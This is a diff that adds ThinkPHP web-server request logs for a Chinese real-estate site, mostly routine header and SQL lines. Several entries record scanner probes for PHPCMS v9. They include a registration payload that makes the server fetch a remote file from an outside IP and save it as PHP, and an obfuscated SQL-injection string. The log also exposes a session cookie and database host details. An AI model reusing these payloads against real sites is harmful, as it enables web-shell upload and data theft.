+  'cookie' => 'Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lvt_080836300300be57b7f34f4b3e97d911=1520001952; PHPSESSID=pkrf33abic12vh9n1h58lgud70; Hm_lvt_56fd97fab2697f58776995f4884b17f8=1519983767,1520001404; Hm_lpvt_56fd97fab2697f58776995f4884b17f8=1520071618',
+  'host' => 'www.yingdizichan.com',
+  'referer' => 'http://www.yingdizichan.com/index/about/employ.html',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-03-03T21:52:40+08:00 ] 139.129.142.167 140.205.225.200 POST /index.php?m=member&c=index&a=register&siteid=1
+[ info ] www.yingdizichan.com:80/index.php?m=member&c=index&a=register&siteid=1 [运行时间：0.086620s][吞吐率：11.54req/s] [内存消耗：4,321.22kb] [文件加载：51]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '171',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'accept-encoding' => 'identity',
+  'connection' => 'close',
+  'host' => 'www.yingdizichan.com:80',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-register-upload)',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'member',
+  'c' => 'index',
+  'a' => 'register',
+  'siteid' => '1',
+  'modelid' => '11',
+  'username' => 'wbYLrlvC',
+  'password' => 'wbYLrlvC',
+  'email' => 'wbYLrlvC@aliyun.com',
+  'info' => 
+  array (
+    'content' => '<img src=http://120.26.55.211/s.txt?.php#.jpg>',
+  ),
+  'dosubmit' => '1',
+  'protocol' => '',
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/home/qxu1590200456/htdocs/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /data/home/qxu1590200456/htdocs/application/index/view/index/index.html [ array (
+  0 => 'sale',
+  1 => 'news',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.030337s ] mysql:host=qdm162701354.my3w.com;dbname=qdm162701354_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_sale` [ RunTime:0.002287s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_sale` ORDER BY sale_creatime desc LIMIT 10 [ RunTime:0.001253s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_article` [ RunTime:0.002062s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_article` ORDER BY article_creatime desc LIMIT 4 [ RunTime:0.001154s ]
+---------------------------------------------------------------
+[ 2018-03-03T21:52:41+08:00 ] 139.129.142.167 140.205.225.200 GET /index.php?m=wap&a=index&siteid=1
+[ info ] www.yingdizichan.com:80/index.php?m=wap&a=index&siteid=1 [运行时间：0.057012s][吞吐率：17.54req/s] [内存消耗：4,319.16kb] [文件加载：51]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'connection' => 'close',
+  'host' => 'www.yingdizichan.com:80',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'wap',
+  'a' => 'index',
+  'siteid' => '1',
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/home/qxu1590200456/htdocs/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /data/home/qxu1590200456/htdocs/application/index/view/index/index.html [ array (
+  0 => 'sale',
+  1 => 'news',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.003946s ] mysql:host=qdm162701354.my3w.com;dbname=qdm162701354_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_sale` [ RunTime:0.001838s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_sale` ORDER BY sale_creatime desc LIMIT 10 [ RunTime:0.001127s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_article` [ RunTime:0.001455s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_article` ORDER BY article_creatime desc LIMIT 4 [ RunTime:0.001044s ]
+---------------------------------------------------------------
+[ 2018-03-03T21:52:42+08:00 ] 139.129.142.167 140.205.225.200 GET /index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27a*nd%20ex*p(~(sele*ct%25*2afro*m(sele*ct+co*nc*at(0x7e,md5(233333),0x7e))x))%23%26m%3D1%26f%3Dtest%26modelid%3D2%26catid%3D6
+[ info ] www.yingdizichan.com:80/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27a*nd%20ex*p(~(sele*ct%25*2afro*m(sele*ct+co*nc*at(0x7e,md5(233333),0x7e))x))%23%26m%3D1%26f%3Dtest%26modelid%3D2%26catid%3D6 [运行时间：0.059377s][吞吐率：16.84req/s] [内存消耗：4,320.46kb] [文件加载：51]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'connection' => 'close',
+  'cookie' => '',
+  'host' => 'www.yingdizichan.com:80',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'attachment',
+  'c' => 'attachments',
+  'a' => 'swfupload_json',
+  'aid' => '1',
+  'src' => '&id=%*27a*nd ex*p(~(sele*ct%*2afro*m(sele*ct co*nc*at(0x7e,md5(233333),0x7e))x))#&m=1&f=test&modelid=2&catid=6',
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/home/qxu1590200456/htdocs/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /data/home/qxu1590200456/htdocs/application/index/view/index/index.html [ array (
+  0 => 'sale',
+  1 => 'news',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.004104s ] mysql:host=qdm162701354.my3w.com;dbname=qdm162701354_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_sale` [ RunTime:0.001960s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_sale` ORDER BY sale_creatime desc LIMIT 10 [ RunTime:0.001024s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_article` [ RunTime:0.001357s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_article` ORDER BY article_creatime desc LIMIT 4 [ RunTime:0.001116s ]
+---------------------------------------------------------------
+[ 2018-03-03T21:52:42+08:00 ] 139.129.142.167 140.205.225.200 GET /index.php?m=content&c=down&a_k=
+[ info ] www.yingdizichan.com:80/index.php?m=content&c=down&a_k= [运行时间：0.057267s][吞吐率：17.46req/s] [内存消耗：4,319.59kb] [文件加载：51]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'connection' => 'close',
+  'cookie' => '',
+  'host' => 'www.yingdizichan.com:80',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'content',
+  'c' => 'down',
+  'a_k' => '',
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/home/qxu1590200456/htdocs/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /data/home/qxu1590200456/htdocs/application/index/view/index/index.html [ array (
+  0 => 'sale',
+  1 => 'news',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.004695s ] mysql:host=qdm162701354.my3w.com;dbname=qdm162701354_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_sale` [ RunTime:0.002062s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_sale` ORDER BY sale_creatime desc LIMIT 10 [ RunTime:0.001103s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_article` [ RunTime:0.001619s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_article` ORDER BY article_creatime desc LIMIT 4 [ RunTime:0.001061s ]
+---------------------------------------------------------------
+[ 2018-03-03T21:57:57+08:00 ] 139.129.142.167 140.205.225.183 POST /index.php?m=member&c=index&a=register&siteid=1
+[ info ] yingdizichan.com:80/index.php?m=member&c=index&a=register&siteid=1 [运行时间：0.056730s][吞吐率：17.63req/s] [内存消耗：4,321.28kb] [文件加载：51]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'content-length' => '171',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'accept-encoding' => 'identity',
+  'connection' => 'close',
+  'host' => 'yingdizichan.com:80',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-register-upload)',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'member',
+  'c' => 'index',
+  'a' => 'register',
+  'siteid' => '1',
+  'modelid' => '11',
+  'username' => 'fSlzkEvD',
+  'password' => 'fSlzkEvD',
+  'email' => 'fSlzkEvD@aliyun.com',
+  'info' => 
+  array (
+    'content' => '<img src=http://120.26.55.211/s.txt?.php#.jpg>',
+  ),
+  'dosubmit' => '1',
+  'protocol' => '',
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/home/qxu1590200456/htdocs/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /data/home/qxu1590200456/htdocs/application/index/view/index/index.html [ array (
+  0 => 'sale',
+  1 => 'news',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.004449s ] mysql:host=qdm162701354.my3w.com;dbname=qdm162701354_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_sale` [ RunTime:0.002065s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_sale` ORDER BY sale_creatime desc LIMIT 10 [ RunTime:0.001179s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_article` [ RunTime:0.001477s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_article` ORDER BY article_creatime desc LIMIT 4 [ RunTime:0.001231s ]
+---------------------------------------------------------------
+[ 2018-03-03T21:57:58+08:00 ] 139.129.142.167 140.205.225.183 GET /index.php?m=wap&a=index&siteid=1
+[ info ] yingdizichan.com:80/index.php?m=wap&a=index&siteid=1 [运行时间：0.055536s][吞吐率：18.01req/s] [内存消耗：4,319.31kb] [文件加载：51]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'connection' => 'close',
+  'host' => 'yingdizichan.com:80',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'wap',
+  'a' => 'index',
+  'siteid' => '1',
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/home/qxu1590200456/htdocs/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /data/home/qxu1590200456/htdocs/application/index/view/index/index.html [ array (
+  0 => 'sale',
+  1 => 'news',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.004354s ] mysql:host=qdm162701354.my3w.com;dbname=qdm162701354_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_sale` [ RunTime:0.002121s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_sale` ORDER BY sale_creatime desc LIMIT 10 [ RunTime:0.001126s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_article` [ RunTime:0.001456s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_article` ORDER BY article_creatime desc LIMIT 4 [ RunTime:0.001080s ]
+---------------------------------------------------------------
+[ 2018-03-03T21:57:58+08:00 ] 139.129.142.167 140.205.225.183 GET /index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27a*nd%20ex*p(~(sele*ct%25*2afro*m(sele*ct+co*nc*at(0x7e,md5(233333),0x7e))x))%23%26m%3D1%26f%3Dtest%26modelid%3D2%26catid%3D6
+[ info ] yingdizichan.com:80/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27a*nd%20ex*p(~(sele*ct%25*2afro*m(sele*ct+co*nc*at(0x7e,md5(233333),0x7e))x))%23%26m%3D1%26f%3Dtest%26modelid%3D2%26catid%3D6 [运行时间：0.056588s][吞吐率：17.67req/s] [内存消耗：4,320.45kb] [文件加载：51]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'connection' => 'close',
+  'cookie' => '',
+  'host' => 'yingdizichan.com:80',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'attachment',
+  'c' => 'attachments',
+  'a' => 'swfupload_json',
+  'aid' => '1',
+  'src' => '&id=%*27a*nd ex*p(~(sele*ct%*2afro*m(sele*ct co*nc*at(0x7e,md5(233333),0x7e))x))#&m=1&f=test&modelid=2&catid=6',
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/home/qxu1590200456/htdocs/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /data/home/qxu1590200456/htdocs/application/index/view/index/index.html [ array (
+  0 => 'sale',
+  1 => 'news',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.005794s ] mysql:host=qdm162701354.my3w.com;dbname=qdm162701354_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_sale` [ RunTime:0.001960s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_sale` ORDER BY sale_creatime desc LIMIT 10 [ RunTime:0.001167s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_article` [ RunTime:0.001531s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_article` ORDER BY article_creatime desc LIMIT 4 [ RunTime:0.001144s ]
+---------------------------------------------------------------
+[ 2018-03-03T21:57:58+08:00 ] 139.129.142.167 140.205.225.183 GET /index.php?m=content&c=down&a_k=
+[ info ] yingdizichan.com:80/index.php?m=content&c=down&a_k= [运行时间：0.054879s][吞吐率：18.22req/s] [内存消耗：4,319.59kb] [文件加载：51]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'identity',
+  'connection' => 'close',
+  'cookie' => '',
+  'host' => 'yingdizichan.com:80',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
+)
+[ info ] [ PARAM ] array (
+  'm' => 'content',
+  'c' => 'down',
+  'a_k' => '',
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/home/qxu1590200456/htdocs/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /data/home/qxu1590200456/htdocs/application/index/view/index/index.html [ array (
+  0 => 'sale',
+  1 => 'news',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.004232s ] mysql:host=qdm162701354.my3w.com;dbname=qdm162701354_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_sale` [ RunTime:0.001976s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_sale` ORDER BY sale_creatime desc LIMIT 10 [ RunTime:0.001038s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_article` [ RunTime:0.001527s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_article` ORDER BY article_creatime desc LIMIT 4 [ RunTime:0.001106s ]
+---------------------------------------------------------------
+[ 2018-03-03T23:37:50+08:00 ] 139.129.142.167 120.35.38.224 GET /
+[ info ] www.yingdizichan.com/ [运行时间：0.088942s][吞吐率：11.24req/s] [内存消耗：4,318.52kb] [文件加载：51]
+[ info ] [ LANG ] /data/home/qxu1590200456/htdocs/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => 'text/html,application/xhtml+xml,text/xml',
+  'accept-language' => 'zh-cn',
+  'connection' => 'Keep-Alive',
+  'host' => 'www.yingdizichan.com',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\index\controller\Index->index[ /data/home/qxu1590200456/htdocs/application/index/controller/Index.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ VIEW ] /data/home/qxu1590200456/htdocs/application/index/view/index/index.html [ array (
+  0 => 'sale',
+  1 => 'news',
+) ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.031236s ] mysql:host=qdm162701354.my3w.com;dbname=qdm162701354_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_sale` [ RunTime:0.003116s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_sale` ORDER BY sale_creatime desc LIMIT 10 [ RunTime:0.001312s ]
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fdc_article` [ RunTime:0.001945s ]
+[ sql ] [ SQL ] SELECT * FROM `fdc_article` ORDER BY article_creatime desc LIMIT 4 [ RunTime:0.001385s ]
